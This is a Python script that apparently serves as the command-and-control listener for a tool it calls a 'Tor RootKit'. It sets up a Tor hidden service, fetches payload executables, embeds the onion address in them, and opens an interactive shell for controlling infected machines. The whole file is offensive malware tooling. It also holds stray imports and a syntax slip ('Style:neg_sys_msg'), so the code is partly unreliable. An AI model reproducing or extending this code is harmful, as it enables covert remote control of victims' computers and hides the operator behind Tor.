from logging.config import listen
from turtle import forward
from shell import ListenerShell
from shell_ui.style import Style
from argparse import ArgumentParser
import shell_ui.ascii_art as banner
import generate_executables
from network import (
    ListenerSocket,
    Tor
)
class Listener:
    def __init__(self):
        listener_port, forward_port = Listener.parse_args()
        self.tor_hidden_service = Tor('Listener', listener_port, forward_port)
        generate_executables.download_executables()
        listener_socket = ListenerSocket(forward_port)
        generate_executables.append_address(self.tor_hidden_service.get_onion_address(), listener_port)
        listener_socket.start()
        shell = ListenerShell(listener_socket)
        shell.run()
    @staticmethod
    def parse_args():
        parser = ArgumentParser(description='Python3 for Tor RootKit Listener')
        parser.add_argument('listener_port', type=int, help='The hidden port service should be listening on. ')
        parser.add_argument('forward_port', type=int, help='The hidden port service should forward to.')
        args = parser.parse_args()
        return args.listener_port, args.forward_port
    def __del__(self):
        try:
            self.tor_hidden_service.tor_service_process.terminate()
        except AttributeError:
            pass
        else:
             Style.neg_sys_msg('Terminated Tor Process')
        finally:
            Style:neg_sys_msg('Exiting')
if __name__ == '__main__':
    banner.draw()
    Listener()
                